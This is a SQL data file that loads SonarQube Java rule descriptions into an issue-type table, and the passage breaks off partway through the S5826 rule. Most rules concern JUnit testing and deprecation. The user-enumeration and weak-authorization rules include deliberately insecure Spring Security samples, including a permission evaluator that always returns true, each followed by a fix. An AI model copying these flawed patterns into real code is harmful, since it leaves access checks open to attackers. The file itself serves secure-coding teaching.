INSERT INTO violationTracker.issue_type (uuid, type, specification_source, category, description, language, status, severity, scope) VALUES ('java:S5738', '"@Deprecated" code marked for removal should never be used', 'sonarqube', 'Code Smell', '<p>Java 9 introduced a flag for the <code>@Deprecated</code> annotation, which allows to explicitly say if the deprecated code is planned to be
removed at some point or not. This is done using <code>forRemoval=true</code> as annotation parameter. The javadoc of the annotation explicitly
mention the following: </p>
<blockquote>
  <p>If true, it means that this API element is earmarked for removal in a future release.</p>
  <p>If false, the API element is deprecated, but there is currently no intention to remove it in a future release.</p>
</blockquote>
<p>While usually deprecated classes, interfaces, and their deprecated members should be avoided rather than used, inherited or extended, those already
marked for removal are much more sensitive to causing trouble in your code soon. Consequently, any usage of such deprecated code should be avoided or
removed.</p>
<h2>Noncompliant Code Example</h2>
<pre>
/**
 * @deprecated As of release 1.3, replaced by {@link #Fee}. Will be dropped with release 1.4.
 */
@Deprecated(forRemoval=true)
public class Foo { ... }

public class Bar {
  /**
   * @deprecated  As of release 1.7, replaced by {@link #doTheThingBetter()}
   */
  @Deprecated(forRemoval=true)
  public void doTheThing() { ... }

  public void doTheThingBetter() { ... }

  /**
   * @deprecated As of release 1.14 due to poor performances.
   */
  @Deprecated(forRemoval=false)
  public void doTheOtherThing() { ... }
}

public class Qix extends Bar {
  @Override
  public void doTheThing() { ... } // Noncompliant; don''t override a deprecated method marked for removal
}

public class Bar extends Foo {  // Noncompliant; Foo is deprecated and will be removed

  public void myMethod() {
    Bar bar = new Bar();  // okay; the class isn''t deprecated
    bar.doTheThing();  // Noncompliant; doTheThing method is deprecated and will be removed

    bar.doTheOtherThing(); // Okay; deprecated, but not marked for removal
  }
}
</pre>
<h2>See</h2>
<ul>
  <li> <a href="http://cwe.mitre.org/data/definitions/477.html">MITRE, CWE-477</a> - Use of Obsolete Functions </li>
  <li> <a href="https://wiki.sei.cmu.edu/confluence/x/6TdGBQ">CERT, MET02-J.</a> - Do not use deprecated or obsolete classes or methods </li>
  <li> RSPEC-1874 for standard deprecation use </li>
</ul>', 'java', 'READY', 'MAJOR', 'BLOCK');
INSERT INTO violationTracker.issue_type (uuid, type, specification_source, category, description, language, status, severity, scope) VALUES ('java:S5776', 'Exception testing via JUnit ExpectedException rule should not be mixed with other assertions', 'sonarqube', 'Code Smell', '<p>When testing exception via <code>org.junit.rules.ExpectedException</code> any code after the raised exception will not be executed, so adding
subsequent assertions is wrong and misleading. This rule raises an issue when an assertion is done after the "expect(...)" invocation, only the code
throwing the expected exception should be after "expect(...)".</p>
<p>You should consider using <a
href="https://github.com/junit-team/junit4/wiki/Exception-testing#using-assertthrows-method">org.junit.Assert.assertThrows</a> instead, it''s available
since JUnit 4.13 and it allows additional subsequent assertions.</p>
<p>Alternatively, you could use <a href="https://github.com/junit-team/junit4/wiki/Exception-testing#trycatch-idiom">try-catch idiom</a> for JUnit
version &lt; 4.13 or if your project does not support lambdas.</p>
<h2>Noncompliant Code Example</h2>
<pre>
@Rule
public ExpectedException thrown = ExpectedException.none();

@Test
public void test() throws IndexOutOfBoundsException {
  thrown.expect(IndexOutOfBoundsException.class); // Noncompliant
  Object o = get();
  // This test pass since execution will never get past this line.
  Assert.assertEquals(0, 1);
}

private Object get() {
  throw new IndexOutOfBoundsException();
}
</pre>
<h2>Compliant Solution</h2>
<ul>
  <li> For JUnit &gt;= 4.13, use <a
  href="https://github.com/junit-team/junit4/wiki/Exception-testing#using-assertthrows-method">org.junit.Assert.assertThrows</a>: </li>
</ul>
<pre>
Assert.assertThrows(IndexOutOfBoundsException.class, () -&gt; get());
// This test correctly fails.
Assert.assertEquals(0, 1);
</pre>
<ul>
  <li> For JUnit &lt; 4.13, use the <a href="https://github.com/junit-team/junit4/wiki/Exception-testing#trycatch-idiom">try-catch idiom</a>: </li>
</ul>
<pre>
try {
  get();
  Assert.fail("Expected an IndexOutOfBoundsException to be thrown");
} catch (IndexOutOfBoundsException e) {}
Assert.assertEquals(0, 1); // Correctly fails.
</pre>
<h2>See</h2>
<ul>
  <li> <a href="https://github.com/junit-team/junit4/wiki/Exception-testing">JUnit exception testing documentation</a> </li>
</ul>', 'java', 'READY', 'MAJOR', 'BLOCK');
INSERT INTO violationTracker.issue_type (uuid, type, specification_source, category, description, language, status, severity, scope) VALUES ('java:S5777', 'Exception testing via JUnit @Test annotation should be avoided', 'sonarqube', 'Code Smell', '<p>When testing exception via <code>@Test</code> annotation, having additional assertions inside that test method can be problematic because any code
after the raised exception will not be executed. It will prevent you to test the state of the program after the raised exception and, at worst, make
you&nbsp;misleadingly think that it is executed.</p>
<p>You should consider moving any assertions into a separate test method where possible, or using <a
href="https://github.com/junit-team/junit4/wiki/Exception-testing#using-assertthrows-method">org.junit.Assert.assertThrows</a> instead.</p>
<p>Alternatively, you could use <a href="https://github.com/junit-team/junit4/wiki/Exception-testing#trycatch-idiom">try-catch idiom</a> for JUnit
version &lt; 4.13 or if your project does not support lambdas.</p>
<h2>Noncompliant Code Example</h2>
<pre>
@Test(expected = IndexOutOfBoundsException.class)
public void testShouldFail() {
  get();
  // This test pass since execution will never get past this line.
  Assert.assertEquals(0, 1);
}

private Object get() {
  throw new IndexOutOfBoundsException();
}
</pre>
<h2>Compliant Solution</h2>
<ul>
  <li> For JUnit &gt;= 4.13, use <a
  href="https://github.com/junit-team/junit4/wiki/Exception-testing#using-assertthrows-method">org.junit.Assert.assertThrows</a>: </li>
</ul>
<pre>
// This test correctly fails.
@Test
public void testToString() {
    Object obj = get();
    Assert.assertThrows(IndexOutOfBoundsException.class, () -&gt; obj.toString());
    Assert.assertEquals(0, 1);
}
</pre>
<ul>
  <li> For JUnit &lt; 4.13, use the <a href="https://github.com/junit-team/junit4/wiki/Exception-testing#trycatch-idiom">try-catch idiom</a>: </li>
</ul>
<pre>
@Test
public void testShouldFail() {
    Object obj = get();
    try {
        obj.toString();
        Assert.fail("Expected an IndexOutOfBoundsException to be thrown");
    } catch (IndexOutOfBoundsException e) {}
    Assert.assertEquals(0, 1); // Correctly fails.
}
</pre>
<h2>See</h2>
<ul>
  <li> <a href="https://github.com/junit-team/junit4/wiki/Exception-testing">JUnit exception testing documentation</a> </li>
</ul>', 'java', 'READY', 'MINOR', 'BLOCK');
INSERT INTO violationTracker.issue_type (uuid, type, specification_source, category, description, language, status, severity, scope) VALUES ('java:S5778', 'Only one method invocation is expected when testing runtime exceptions', 'sonarqube', 'Code Smell', '<p>When verifying that code raises a runtime exception, a good practice is to avoid having multiple method calls inside the tested code, to be
explicit about which method call is expected to raise the exception.</p>
<p>It increases the clarity of the test, and avoid incorrect testing when another method is actually raising the exception.</p>
<h2>Noncompliant Code Example</h2>
<pre>
@Test
public void testToString() {
  // Do you expect get() or toString() throwing the exception?
  org.junit.Assert.assertThrows(IndexOutOfBoundsException.class, () -&gt; get().toString());
}

@Test
public void testToStringTryCatchIdiom() {
  try {
    // Do you expect get() or toString() throwing the exception?
    get().toString();
    Assert.fail("Expected an IndexOutOfBoundsException to be thrown");
  } catch (IndexOutOfBoundsException e) {
    // Test exception message...
  }
}
</pre>
<h2>Compliant Solution</h2>
<pre>
@Test
public void testToString() {
   Object obj = get();
   Assert.assertThrows(IndexOutOfBoundsException.class, () -&gt; obj.toString());
}

@Test
public void testToStringTryCatchIdiom() {
  Object obj = get();
  try {
    obj.toString();
    Assert.fail("Expected an IndexOutOfBoundsException to be thrown");
  } catch (IndexOutOfBoundsException e) {
    // Test exception message...
  }
}
</pre>
<h2>See</h2>
<ul>
  <li> <a href="https://github.com/junit-team/junit4/wiki/Exception-testing">JUnit exception testing documentation</a> </li>
</ul>', 'java', 'READY', 'MAJOR', 'BLOCK');
INSERT INTO violationTracker.issue_type (uuid, type, specification_source, category, description, language, status, severity, scope) VALUES ('java:S5779', 'Assertion methods should not be used within the try block of a try-catch catching an Error', 'sonarqube', 'Bug', '<p>Assertion methods&nbsp;are throwing a "<code>java.lang.AssertionError</code>". If this call is done within the try block of a try-catch cathing a
similar error, you should make sure to test some properties of the exception. Otherwise, the assertion will never fail.</p>
<h2>Noncompliant Code Example</h2>
<pre>
@Test
public void should_throw_assertion_error() {
  try {
    throwAssertionError();
    Assert.fail("Expected an AssertionError!"); // Noncompliant, the AssertionError will be caught and the test will never fail.
  } catch (AssertionError e) {}
}

private void throwAssertionError() {
  throw new AssertionError("My assertion error");
}
</pre>
<h2>Compliant Solution</h2>
<pre>
assertThrows(AssertionError.class, () -&gt; throwAssertionError());
</pre>
<pre>
try {
   throwAssertionError();
   Assert.fail("Expected an AssertionError!"); // Compliant, we made sure to test that the correct error is raised
 } catch (AssertionError e) {
   Assert.assertThat(e.getMessage(), is("My assertion error"));
 }
</pre>
<h2>See</h2>
<ul>
  <li> <a href="https://github.com/junit-team/junit4/wiki/Exception-testing">JUnit 4 exception testing documentation</a> </li>
</ul>', 'java', 'READY', 'CRITICAL', 'BLOCK');
INSERT INTO violationTracker.issue_type (uuid, type, specification_source, category, description, language, status, severity, scope) VALUES ('java:S5783', 'Only one method invocation is expected when testing checked exceptions', 'sonarqube', 'Bug', '<p>When verifying that code raises an exception, a good practice is to avoid having multiple method calls inside the tested code, to be explicit about
what is exactly tested.</p>
<p>When two of the methods can raise the same <strong>checked</strong> exception, not respecting this good practice is a bug, since it is not possible
to know what is really tested.</p>
<p>You should make sure that only one method can raise the expected checked exception in the tested code.</p>
<h2>Noncompliant Code Example</h2>
<pre>
@Test
public void testG() {
  // Do you expect g() or f() throwing the exception?
  assertThrows(IOException.class, () -&gt; g(f(1)) ); // Noncompliant
}

@Test
public void testGTryCatchIdiom() {
  try { // Noncompliant
    g(f(1));
    Assert.fail("Expected an IOException to be thrown");
  } catch (IOException e) {
    // Test exception message...
  }
}

int f(int x) throws IOException {
  // ...
}

int g(int x) throws IOException {
  // ...
}
</pre>
<h2>Compliant Solution</h2>
<pre>
@Test
public void testG() {
  int y = f(1);
  // It is explicit that we expect an exception from g() and not f()
  assertThrows(IOException.class, () -&gt; g(y) );
}

@Test
public void testGTryCatchIdiom() {
  int y = f(1);
  try {
    g(y);
    Assert.fail("Expected an IOException to be thrown");
  } catch (IOException e) {
    // Test exception message...
  }
}
</pre>', 'java', 'READY', 'CRITICAL', 'BLOCK');
INSERT INTO violationTracker.issue_type (uuid, type, specification_source, category, description, language, status, severity, scope) VALUES ('java:S5785', 'JUnit assertTrue/assertFalse should be simplified to the corresponding dedicated assertion', 'sonarqube', 'Code Smell', '<p>Testing equality or nullness with JUnit''s <code>assertTrue()</code> or <code>assertFalse()</code> should be simplified to the corresponding
dedicated assertion.</p>
<h2>Noncompliant Code Example</h2>
<pre>
Assert.assertTrue(a.equals(b));
Assert.assertTrue(a == b);
Assert.assertTrue(a == null);
Assert.assertTrue(a != null);
Assert.assertFalse(a.equals(b));
</pre>
<h2>Compliant Solution</h2>
<pre>
Assert.assertEquals(a, b);
Assert.assertSame(a, b);
Assert.assertNull(a);
Assert.assertNotNull(a);
Assert.assertNotEquals(a, b);
</pre>', 'java', 'READY', 'MAJOR', 'BLOCK');
INSERT INTO violationTracker.issue_type (uuid, type, specification_source, category, description, language, status, severity, scope) VALUES ('java:S5786', 'JUnit5 test classes and methods should have default package visibility', 'sonarqube', 'Code Smell', '<p>JUnit5 is more tolerant regarding the visibilities of Test classes than JUnit4, which required everything to be <code>public</code>.</p>
<p>In this context, JUnit5 test classes can have any visibility but <code>private</code>, however, it is recommended to use the default package
visibility, which improves readability of code.</p>
<h2>Noncompliant Code Example</h2>
<pre>
import org.junit.jupiter.api.Test;

public class MyClassTest { // Noncompliant - modifier can be removed
  @Test
  protected void test() { // Noncompliant - modifier can be removed
    // ...
  }
}
</pre>
<h2>Compliant Solution</h2>
<pre>
import org.junit.jupiter.api.Test;

class MyClassTest {
  @Test
  void test() {
    // ...
  }
}
</pre>
<h2>Exceptions</h2>
<p>This rule does not raise an issue about <code>private</code> visibility, because <code>private</code> test methods and classes are systematically
ignored by JUnit5, without a proper warning. It''s not a <code>Code Smell</code> but a <code>Bug</code> handled by the rule <a href=''/coding_rules#rule_key=java%3AS5810''>S5810</a> .</p>
<h2>See</h2>
<ul>
  <li> <a href="https://junit.org/junit5/docs/current/user-guide/#writing-tests-classes-and-methods">JUnit 5 Test Classes and Methods</a> </li>
</ul>', 'java', 'READY', 'INFO', 'BLOCK');
INSERT INTO violationTracker.issue_type (uuid, type, specification_source, category, description, language, status, severity, scope) VALUES ('java:S5790', 'JUnit5 inner test classes should be annotated with @Nested', 'sonarqube', 'Bug', '<p>If not annotated with <code>@Nested</code>, an inner class containing some tests will never be executed during tests execution. While you could
still be able to manually run its tests in an IDE, it won’t be the case during the build. By contrast, a static nested class containing some tests
should not be annotated with <code>@Nested</code>, JUnit5 will not share setup and state with an instance of its enclosing class.</p>
<p>This rule raises an issue on inner classes and static nested classes containing JUnit5 test methods which has a wrong usage of <code>@Nested</code>
annotation.</p>
<p>Note: This rule does not check if the context in which JUnit 5 is running (e.g. Maven Surefire Plugin) is properly configured to execute static
nested classes, it could not be the case using the default configuration.</p>
<h2>Noncompliant Code Example</h2>
<pre>
import org.junit.jupiter.api.Test;

class MyJunit5Test {
  @Test
  void test() { /* ... */ }

  class InnerClassTest { // Noncompliant, missing @Nested annotation
    @Test
    void test() { /* ... */ }
  }

  @Nested
  static class StaticNestedClassTest { // Noncompliant, invalid usage of @Nested annotation
    @Test
    void test() { /* ... */ }
  }
}
</pre>
<h2>Compliant Solution</h2>
<pre>
import org.junit.jupiter.api.Test;
import org.junit.jupiter.api.Nested;

class MyJunit5Test {
  @Test
  void test() { /* ... */ }

  @Nested
  class InnerClassTest {
    @Test
    void test() { /* ... */ }
  }

  static class StaticNestedClassTest {
    @Test
    void test() { /* ... */ }
  }
}
</pre>', 'java', 'READY', 'CRITICAL', 'BLOCK');
INSERT INTO violationTracker.issue_type (uuid, type, specification_source, category, description, language, status, severity, scope) VALUES ('java:S5793', 'Migrate your tests from JUnit4 to the new JUnit5 annotations', 'sonarqube', 'Code Smell', '<p>As mentioned in JUnit5 documentation, it is possible to integrate JUnit4 with JUnit5:</p>
<blockquote>
  <p>JUnit provides a gentle migration path via a JUnit Vintage test engine which allows existing tests based on JUnit 3 and JUnit 4 to be executed
  using the JUnit Platform infrastructure. Since all classes and annotations specific to JUnit Jupiter reside under a new org.junit.jupiter base
  package, having both JUnit 4 and JUnit Jupiter in the classpath does not lead to any conflicts.</p>
</blockquote>
<p>However, maintaining both systems is a temporary solution. This rule flags all the annotations from JUnit4 which would need to be migrated to
JUnit5, hence helping migration of a project.</p>
<p>Here is the list of JUnit4 annotations tracked by the rule, with their corresponding annotations in JUnit5:</p>
<table>
  <tbody>
    <tr>
      <th>JUnit4</th>
      <th>JUnit5</th>
    </tr>
    <tr>
      <td><code>org.junit.Test</code></td>
      <td><code>org.junit.jupiter.api.Test</code></td>
    </tr>
    <tr>
      <td><code>org.junit.Before</code></td>
      <td><code>org.junit.jupiter.api.BeforeEach</code></td>
    </tr>
    <tr>
      <td><code>org.junit.After</code></td>
      <td><code>org.junit.jupiter.api.AfterEach</code></td>
    </tr>
    <tr>
      <td><code>org.junit.BeforeClass</code></td>
      <td><code>org.junit.jupiter.api.BeforeAll</code></td>
    </tr>
    <tr>
      <td><code>org.junit.AfterClass</code></td>
      <td><code>org.junit.jupiter.api.AfterAll</code></td>
    </tr>
    <tr>
      <td><code>org.junit.Ignore</code></td>
      <td><code>org.junit.jupiter.api.Disabled</code></td>
    </tr>
  </tbody>
</table>
<p>Note that the following annotations might requires some rework of the tests to have JUnit5 equivalent behavior. A simple replacement of the
annotation won''t work immediately:</p>
<table>
  <tbody>
    <tr>
      <th>JUnit4</th>
      <th>JUnit5</th>
    </tr>
    <tr>
      <td><code>org.junit.experimental.categories.Category</code></td>
      <td><code>org.junit.jupiter.api.Tag</code></td>
    </tr>
    <tr>
      <td><code>org.junit.Rule</code></td>
      <td><code>org.junit.jupiter.api.extension.ExtendWith</code></td>
    </tr>
    <tr>
      <td><code>org.junit.ClassRule</code></td>
      <td><code>org.junit.jupiter.api.extension.RegisterExtension</code></td>
    </tr>
    <tr>
      <td><code>org.junit.runner.RunWith</code></td>
      <td><code>org.junit.jupiter.api.extension.ExtendWith</code></td>
    </tr>
  </tbody>
</table>
<h2>Noncompliant Code Example</h2>
<pre>
package org.foo;

import org.junit.After;
import org.junit.AfterClass;
import org.junit.Before;
import org.junit.BeforeClass;
import org.junit.Ignore;
import org.junit.Test;
import org.junit.experimental.categories.Category;
import org.junit.runner.RunWith;

@RunWith(MyJUnit4Runner.class)
public class MyJUnit4Test {

  @BeforeClass
  public static void beforeAll() {
    System.out.println("beforeAll");
  }

  @AfterClass
  public static void afterAll() {
    System.out.println("AfterAll");
  }

  @Before
  public void beforeEach() {
    System.out.println("beforeEach");
  }

  @After
  public void afterEach() {
    System.out.println("afterEach");
  }

  @Test
  public void test1() throws Exception {
    System.out.println("test1");
  }

  public interface SomeTests { /* category marker */ }

  @Test
  @Category(SomeTests.class)
  public void test2() throws Exception {
    System.out.println("test2");
  }

  @Test
  @Ignore("Requires fix of #42")
  public void ignored() throws Exception {
    System.out.println("ignored");
  }
}
</pre>
<h2>Compliant Solution</h2>
<pre>
package org.foo;

import org.junit.jupiter.api.AfterAll;
import org.junit.jupiter.api.AfterEach;
import org.junit.jupiter.api.BeforeAll;
import org.junit.jupiter.api.BeforeEach;
import org.junit.jupiter.api.Disabled;
import org.junit.jupiter.api.Tag;
import org.junit.jupiter.api.Test;
import org.junit.jupiter.api.extension.ExtendWith;

@ExtendWith(MyJUnit5Extension.class)
class MyJUnit5Test {

  @BeforeAll
  static void beforeAll() {
    System.out.println("beforeAll");
  }

  @AfterAll
  static void afterAll() {
    System.out.println("afterAll");
  }

  @BeforeEach
  void beforeEach() {
    System.out.println("beforeEach");
  }

  @AfterEach
  void afterEach() {
    System.out.println("afterEach");
  }

  @Test
  void test1() {
    System.out.println("test1");
  }

  @Test
  @Tag("SomeTests")
  void test2() {
    System.out.println("test2");
  }

  @Test
  @Disabled("Requires fix of #42")
  void disabled() {
    System.out.println("ignored");
  }
}
</pre>
<h2>See</h2>
<ul>
  <li> <a href="https://junit.org/junit5/docs/current/user-guide/#migrating-from-junit4">JUnit 5: Migrating from JUnit4</a> </li>
</ul>', 'java', 'READY', 'INFO', 'BLOCK');
INSERT INTO violationTracker.issue_type (uuid, type, specification_source, category, description, language, status, severity, scope) VALUES ('java:S5803', 'Class members annotated with "@VisibleForTesting" should not be accessed from production code', 'sonarqube', 'Code Smell', '<p>@VisibleForTesting can be used to mark methods, fields and classes whose visibility restrictions have been relaxed more than necessary for the API
to allow for easier unit testing.</p>
<p>Access to such methods, fields and classes only possible thanks to this relaxed visibility is fine for test code, but it should be avoided in
production code. In production code these methods should be treated as if they are private.</p>
<p>Supported framework:</p>
<ul>
  <li> Guava: <code>com.google.common.annotations.VisibleForTesting</code> </li>
  <li> AssertJ: <code>org.assertj.core.util.VisibleForTesting</code> </li>
  <li> Android: <code>androidx.annotation.VisibleForTesting</code> </li>
  <li> Apache Flink: <code>org.apache.flink.annotation.VisibleForTesting</code> </li>
</ul>
<p>or any other annotation named <code>VisibleForTesting</code></p>
<h2>Noncompliant Code Example</h2>
<pre>
/** src/main/java/MyObject.java */

@VisibleForTesting String foo;

/** src/main/java/Service.java */

new MyObject().foo; // Noncompliant, foo is accessed from production code
</pre>
<h2>Compliant Solution</h2>
<pre>
/** src/main/java/MyObject.java */

@VisibleForTesting String foo;

/** src/test/java/MyObjectTest.java */

new MyObject().foo; // Compliant, foo is accessed from test code
</pre>', 'java', 'READY', 'CRITICAL', 'BLOCK');
INSERT INTO violationTracker.issue_type (uuid, type, specification_source, category, description, language, status, severity, scope) VALUES ('java:S5804', 'Allowing user enumeration is security-sensitive', 'sonarqube', 'Security Hotspot', '<p>User enumeration refers to the ability to guess existing usernames in a web application database. This can happen, for example, when using
"sign-in/sign-on/forgot password" functionalities of a website.</p>
<p>When an user tries to "sign-in" to a website with an incorrect username/login, the web application should not disclose that the username doesn''t
exist with a message similar to "this username is incorrect", instead a generic message should be used like "bad credentials", this way it''s not
possible to guess whether the username or password was incorrect during the authentication.</p>
<p>If a user-management feature discloses information about the existence of a username, attackers can use brute force attacks to retrieve a large
amount of valid usernames that will impact the privacy of corresponding users and facilitate other attacks (phishing, password guessing etc ...).</p>
<h2>Ask Yourself Whether</h2>
<ul>
  <li> The application discloses that a username exists in its database: most of the time it''s possible to avoid this kind of leak except for the
  "registration/sign-on" part of a website because in this case the user must choose a valid username (not already taken by another user). </li>
  <li> There is no rate limiting and CAPTCHA protection in place for requests involving a username. </li>
</ul>
<p>There is a risk if you answered yes to any of those questions.</p>
<h2>Recommended Secure Coding Practices</h2>
<p>When a user performs a request involving a username, it should not be possible to spot differences between a valid and incorrect username:</p>
<ul>
  <li> Error messages should be generic and not disclose if the username is valid or not. </li>
  <li> The response time must be similar for a valid username or not. </li>
  <li> CAPTCHA and other rate limiting solutions should be implemented. </li>
</ul>
<h2>Sensitive Code Example</h2>
<p>In a Spring-security web application the username leaks when:</p>
<ul>
  <li> The string used as argument of <a
  href="https://docs.spring.io/spring-security/site/docs/current/api/org/springframework/security/core/userdetails/UserDetailsService.html">loadUserByUsername</a> method is used in an exception message: </li>
</ul>
<pre>
public String authenticate(String username, String password) {
  // ....
  MyUserDetailsService s1 = new MyUserDetailsService();
  MyUserPrincipal u1 = s1.loadUserByUsername(username);

  if(u1 == null) {
    throw new BadCredentialsException(username+" doesn''t exist in our database"); // Sensitive
  }
  // ....
}
</pre>
<ul>
  <li> <a
  href="https://docs.spring.io/spring-security/site/docs/3.0.x/apidocs/org/springframework/security/core/userdetails/UsernameNotFoundException.html">UsernameNotFoundException</a> is thrown (except when it is in the loadUserByUsername method): </li>
</ul>
<pre>
public String authenticate(String username, String password) {
  // ....
  if(user == null) {
      throw new UsernameNotFoundException("user not found"); // Sensitive
  }
  // ....
}
</pre>
<ul>
  <li> <a
  href="https://docs.spring.io/spring-security/site/docs/4.0.x/apidocs/org/springframework/security/authentication/dao/AbstractUserDetailsAuthenticationProvider.html#setHideUserNotFoundExceptions-boolean-">HideUserNotFoundExceptions</a> is set to false: </li>
</ul>
<pre>
DaoAuthenticationProvider daoauth = new DaoAuthenticationProvider();
daoauth.setUserDetailsService(new MyUserDetailsService());
daoauth.setPasswordEncoder(new BCryptPasswordEncoder());
daoauth.setHideUserNotFoundExceptions(false); // Sensitive
builder.authenticationProvider(daoauth);
</pre>
<h2>Compliant Solution</h2>
<p>In a Spring-security web application:</p>
<ul>
  <li> the same message should be used regardless of whether it is the wrong user or password: </li>
</ul>
<pre>
public String authenticate(String username, String password) throws AuthenticationException {
  Details user = null;
  try {
    user = loadUserByUsername(username);
  } catch (UsernameNotFoundException | DataAccessException e) {
    // Hide this exception reason to not disclose that the username doesn''t exist
  }
  if (user == null || !user.isPasswordCorrect(password)) {
     // User should not be able to guess if the bad credentials message is related to the username or the password
    throw new BadCredentialsException("Bad credentials");
  }
}
</pre>
<ul>
  <li> <a
  href="https://docs.spring.io/spring-security/site/docs/4.0.x/apidocs/org/springframework/security/authentication/dao/AbstractUserDetailsAuthenticationProvider.html#setHideUserNotFoundExceptions-boolean-">HideUserNotFoundExceptions</a> should be set to true: </li>
</ul>
<pre>
DaoAuthenticationProvider daoauth = new DaoAuthenticationProvider();
daoauth.setUserDetailsService(new MyUserDetailsService());
daoauth.setPasswordEncoder(new BCryptPasswordEncoder());
daoauth.setHideUserNotFoundExceptions(true); // Compliant
builder.authenticationProvider(daoauth);
</pre>
<h2>See</h2>
<ul>
  <li> <a href="https://owasp.org/www-project-top-ten/OWASP_Top_Ten_2017/Top_10-2017_A2-Broken_Authentication">OWASP Top 10 2017 Category A2</a> -
  Broken Authentication </li>
  <li> <a href="https://cwe.mitre.org/data/definitions/200.html">MITRE, CWE-200</a> - Exposure of Sensitive Information to an Unauthorized Actor </li>
</ul>', 'java', 'READY', 'MAJOR', 'BLOCK');
INSERT INTO violationTracker.issue_type (uuid, type, specification_source, category, description, language, status, severity, scope) VALUES ('java:S5808', 'Authorizations should be based on strong decisions', 'sonarqube', 'Vulnerability', '<p>Authorizations granted or not to users to access resources of an application should be based on strong decisions. For instance, checking whether
the user is authenticated or not, has the right roles/privileges. It may also depend on the user''s location, or the date, time when the user requests
access.</p>
<h2>Noncompliant Code Example</h2>
<p>In a Spring-security web application:</p>
<ul>
  <li> the <code>vote</code> method of an <a
  href="https://docs.spring.io/spring-security/site/docs/4.0.x/apidocs/org/springframework/security/access/AccessDecisionVoter.html">AccessDecisionVoter</a> type is not compliant when it returns only an affirmative decision (<code>ACCESS_GRANTED</code>) or abstains to make a decision (<code>ACCESS_ABSTAIN</code>): </li>
</ul>
<pre>
public class WeakNightVoter implements AccessDecisionVoter {
    @Override
    public int vote(Authentication authentication, Object object, Collection collection) {  // Noncompliant

      Calendar calendar = Calendar.getInstance();

      int currentHour = calendar.get(Calendar.HOUR_OF_DAY);

      if(currentHour &gt;= 8 &amp;&amp; currentHour &lt;= 19) {
        return ACCESS_GRANTED; // Noncompliant
      }

      // when users connect during the night, do not make decision
      return ACCESS_ABSTAIN; // Noncompliant
    }
}
</pre>
<ul>
  <li> the <code>hasPermission</code> method of a <a
  href="https://docs.spring.io/spring-security/site/docs/4.2.13.RELEASE/apidocs/org/springframework/security/access/PermissionEvaluator.html">PermissionEvaluator</a> type is not compliant when it doesn''t return <code>false</code>: </li>
</ul>
<pre>
public class MyPermissionEvaluator implements PermissionEvaluator {
    @Override
    public boolean hasPermission(Authentication authentication, Object targetDomainObject, Object permission) {
        //Getting subject
        Object user = authentication.getPrincipal();

        if(user.getRole().equals(permission)) {
              return true; // Noncompliant
        }

        return true;  // Noncompliant
    }
}
</pre>
<h2>Compliant Solution</h2>
<p>In a Spring-security web application:</p>
<ul>
  <li> the <code>vote</code> method of an <a
  href="https://docs.spring.io/spring-security/site/docs/4.0.x/apidocs/org/springframework/security/access/AccessDecisionVoter.html">AccessDecisionVoter</a> type should return a negative decision (<code>ACCESS_DENIED</code>): </li>
</ul>
<pre>
public class StrongNightVoter implements AccessDecisionVoter {
    @Override
    public int vote(Authentication authentication, Object object, Collection collection) {

      Calendar calendar = Calendar.getInstance();

      int currentHour = calendar.get(Calendar.HOUR_OF_DAY);

      if(currentHour &gt;= 8 &amp;&amp; currentHour &lt;= 19) {
        return ACCESS_GRANTED;
      }

      // users are not allowed to connect during the night
      return ACCESS_DENIED; // Compliant
    }
}
</pre>
<ul>
  <li> the <code>hasPermission</code> method of a <a
  href="https://docs.spring.io/spring-security/site/docs/4.2.13.RELEASE/apidocs/org/springframework/security/access/PermissionEvaluator.html">PermissionEvaluator</a> type should return <code>false</code>: </li>
</ul>
<pre>
public class MyPermissionEvaluator implements PermissionEvaluator {
    @Override
    public boolean hasPermission(Authentication authentication, Object targetDomainObject, Object permission) {
        //Getting subject
        Object user = authentication.getPrincipal();

        if(user.getRole().equals(permission)) {
              return true;
        }

        return false; // Compliant
    }
}
</pre>
<h2>See</h2>
<ul>
  <li> <a href="https://www.owasp.org/index.php/Top_10-2017_A5-Broken_Access_Control">OWASP Top 10 2017 Category A5</a> - Boken Access Control </li>
  <li> <a href="https://cwe.mitre.org/data/definitions/285.html">MITRE, CWE-285</a> - Improper Authorization </li>
</ul>', 'java', 'READY', 'MAJOR', 'BLOCK');
INSERT INTO violationTracker.issue_type (uuid, type, specification_source, category, description, language, status, severity, scope) VALUES ('java:S5810', 'JUnit5 test classes and methods should not be silently ignored', 'sonarqube', 'Bug', '<p>JUnit5 is more tolerant regarding the visibilities of Test classes and methods than JUnit4, which required everything to be public. JUnit5 supports
default package, public and protected visibility, even if it is recommended to use the default package visibility, which improves the readability of
code.</p>
<p>But JUnit5 ignores without any warning:</p>
<ul>
  <li> private classes and private methods </li>
  <li> static methods </li>
  <li> methods returning a value without being a TestFactory </li>
</ul>
<h2>Noncompliant Code Example</h2>
<pre>
import org.junit.jupiter.api.Test;

class MyClassTest {
  @Test
  private void test1() { // Noncompliant - ignored by JUnit5
    // ...
  }
  @Test
  static void test2() { // Noncompliant - ignored by JUnit5
    // ...
  }
  @Test
  boolean test3() { // Noncompliant - ignored by JUnit5
    // ...
  }
  @Nested
  private class MyNestedClass { // Noncompliant - ignored by JUnit5
    @Test
    void test() {
      // ...
    }
  }
}
</pre>
<h2>Compliant Solution</h2>
<pre>
import org.junit.jupiter.api.Test;

class MyClassTest {
  @Test
  void test1() {
    // ...
  }
  @Test
  void test2() {
    // ...
  }
  @Test
  void test3() {
    // ...
  }
  @Nested
  class MyNestedClass {
    @Test
    void test() {
      // ...
    }
  }
}
</pre>', 'java', 'READY', 'MAJOR', 'BLOCK');
INSERT INTO violationTracker.issue_type (uuid, type, specification_source, category, description, language, status, severity, scope) VALUES ('java:S5826', 'Methods setUp() and tearDown() should be correctly annotated starting with JUnit4', 'sonarqube', 'Code Smell', '<p>The <code>setUp()</code> and <code>tearDown()</code> methods (initially introduced with JUnit3 to execute a block of code before and after each
test) need to be correctly annotated with the equivalent annotation in order to preserve the same behavior when migrating from JUnit3 to JUnit4 or
JUnit5.</p>
<p>This rule consequently raise issues on <code>setUp()</code> and <code>tearDown()</code> methods which are not annotated in test classes.</p>
<h2>Noncompliant Code Example</h2>
<ul>
  <li> JUnit4: </li>
</ul>
<pre>
public void setUp() { ... } // Noncompliant; should be annotated with @Before
public void tearDown() { ... }  // Noncompliant; should be annotated with @After
</pre>
<ul>
  <li> JUnit5: </li>
</ul>
<pre>
public void setUp() { ... } // Noncompliant; should be annotated with @BeforeEach
public void tearDown() { ... }  // Noncompliant; should be annotated with @AfterEach
</pre>
<h2>Compliant Solution</h2>
<ul>
  <li> JUnit4: </li>
</ul>
